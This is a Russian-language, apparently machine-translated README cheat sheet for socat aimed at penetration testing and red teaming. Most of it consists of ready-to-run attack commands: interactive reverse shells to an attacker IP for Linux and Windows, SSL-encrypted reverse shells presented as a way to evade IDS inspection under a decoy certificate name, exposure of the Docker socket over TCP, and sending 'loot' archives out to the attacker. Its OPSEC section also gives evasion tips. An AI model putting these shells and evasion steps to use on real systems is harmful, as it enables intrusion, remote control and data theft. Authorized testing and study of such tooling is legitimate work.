<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Socat-SOocket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Эксплуатация и снаряды">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Протоколы">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Лицензия GPLv2">
</p>

<p выравнивание="центр">
  <b>🌐 Установить два двунаправленных потока байтов и передавать данные между файлами, каналами, устройствами, сокетами и туннелями SSL</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектура Socat](#-overview--the-socat-architecture)
- [Сравнение Socat и Netcat] (#-socat-vs-netcat-сравнение)
- [Установка](#-установка)
- [Полностью интерактивные обратные оболочки TTY](#-fully-interactive-tty-reverse-shells)
  - [Прослушиватель атакующего (RAW TTY)](#attacker-listener-raw-tty)
  - [Целевая полезная нагрузка (Pty Spawn)](#target-payload-pty-spawn)
  - [Целевая обратная оболочка Windows](#windows-target-reverse-shell)
- [Зашифрованные обратные оболочки через SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Генерация сертификатов](#generating-certificates)
  - [Зашифрованный прослушиватель и соединение](#encrypted-listener--connection)
- [Переадресация портов и сетевые реле](#-port-forwarding--network-relays)
  - [Переадресация локального порта](#local-port-forwarding)
  - [Прослушиватель разветвления (мультиклиент)](#forking-listener-multi-client)
  - [Сокет домена UNIX для TCP-реле (пересылка Docker)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Передача файлов с помощью Socat](#-file-transfers-with-socat)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и OPSEC](#-защитные-соображения--opsec)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура Socat

**Socat** (SOocket CAT) — это утилита на основе командной строки, которая создает два двунаправленных потока байтов и передает данные между ними. Поскольку потоки могут быть созданы из огромного набора типов адресов (файлы, каналы, устройства, сокеты TCP/UDP, SSL, необработанный IP-адрес, SOCKS4, сокеты домена UNIX), Socat часто называют Netcat на стероидах.

В тестировании на проникновение и Red Teaming компания Socat славится двумя основными суперспособностями:
1. **Мгновенные полностью интерактивные обратные оболочки TTY:** Создание настоящих псевдотерминалов (`pty`) с управлением заданиями, клавишами со стрелками и автозаполнением без необходимости использования Python или `stty raw -echo`.
2. **Зашифрованные сетевые туннели SSL/TLS.** Обход стандартной проверки IDS за счет шифрования полезных данных открытого текста через SSL.

---

## ⚖️ Сравнение Socat и Netcat

| Особенность | Netcat (`nc`) | Нмап `ncat` | Сокат (`socat`) |
|---------|---------------|-------------|-----------------|
| **Встроенный спавн оболочки PTY** | ❌ Нет | ❌ Нет | ✅ Родной (`pty,stderr,setsid`) |
| **SSL/TLS-шифрование** | ❌ Нет | ✅ Да (`--ssl`) | ✅ Родной (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Разветвление многоклиентской ретрансляции**| ❌ Нет | ❌ Нет | ✅ Родной (`fork,reuseaddr`) |
| **Доменные сокеты UNIX** | ❌ Нет | ✅ Ограниченная | ✅ Родной (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Размер двоичного файла** | Минимальный (~40 КБ) | Умеренный (~500 КБ) | Умеренный (~400 КБ отдельно) |
| **Синтаксис команды** | Простые флаги (`-lvnp`) | На основе флага (`-lvnp`) | Синтаксис потока (`<type>:<args>`) |

---

## 📥 Установка
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Полностью интерактивные обратные оболочки телетайпа

Когда вы ловите обратную оболочку стандартным Netcat, вы получаете нестабильную тупую оболочку. Socat предоставляет 100% стабильный, полностью интерактивный псевдотерминал с завершением табуляции, обработкой Ctrl+C и поддержкой экранного редактора (`vim`, `nano`).

### Прослушиватель атакующего (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!ПРИМЕЧАНИЕ]
> `file:`tty`,raw,echo=0` переводит ваш локальный терминал в необработанный режим и отключает отображение символов. Если соединение неожиданно закрывается и ваш терминал не отвечает, введите `reset` и нажмите Enter.

### Целевая полезная нагрузка (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Распределение опций:
- `pty`: выделяет псевдотерминал в целевой системе.
- `stderr`: перенаправляет стандартную ошибку в сокет.
- `setsid`: запускает процесс в новой группе сеансов (предотвращает уничтожение при выходе родителя).
- `sigint`: передает сигналы прерывания (Ctrl+C) удаленному процессу вместо завершения сеанса.
- `sane`: Сбрасывает настройки управления терминалом к ​​стандартным значениям по умолчанию.

### Целевая обратная оболочка Windows
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Зашифрованные обратные оболочки через SSL/TLS

Запретите мониторингу сетевой безопасности (NSM), Zeek и Snort проверять полезную нагрузку обратной оболочки, зашифровав трафик с помощью эфемерного сертификата SSL/TLS.

### Генерация сертификатов
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Зашифрованный прослушиватель и соединение
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Переадресация портов и сетевые реле

Socat может перенаправлять входящий трафик с одного сетевого интерфейса или порта непосредственно на другую удаленную цель.

### Переадресация локального порта
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Прослушиватель разветвления (мультиклиент)

Опция `fork` позволяет Socat запускать дочерний процесс для каждого нового входящего соединения, оставляя основной прослушиватель открытым:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### Сокет домена UNIX для TCP-реле (пересылка Docker)

При доступе к локальному сокету демона Docker (`/var/run/docker.sock`) без root-прав по сети:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Передача файлов с помощью Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(Флаг `-u` указывает однонаправленный режим от первого адреса ко второму).*

---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Интерактивный прослушиватель телетайпа** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Интерактивная полезная нагрузка телетайпа** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Зашифрованный прослушиватель SSL** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Зашифрованная полезная нагрузка SSL** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Переадресация портов (реле)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **Открыть сокет UNIX** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Передача файлов (приемник)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Передача файлов (отправитель)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Оборонительные соображения и OPSEC

1. **Шифрование трафика:** Обратные оболочки TCP с открытым текстом предоставляют команды IDS/IPS. Всегда используйте `OPENSSL-LISTEN` и `OPENSSL` во время сражений красной команды.
2. **Мониторинг процессов.** Платформы Sysmon/EDR помечают команды, вызывающие `pty,stderr,setsid`, как немедленную эвристику обратной оболочки.
3. **Автономные двоичные файлы.** При развертывании в целевых системах используйте статически скомпилированные автономные двоичные файлы Socat, чтобы избежать зависимостей между общими библиотеками.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Эта шпаргалка предназначена только для авторизованного тестирования на проникновение, оценки безопасности и академических исследований. Несанкционированный доступ к компьютерным системам и вмешательство в сеть строго противозаконны.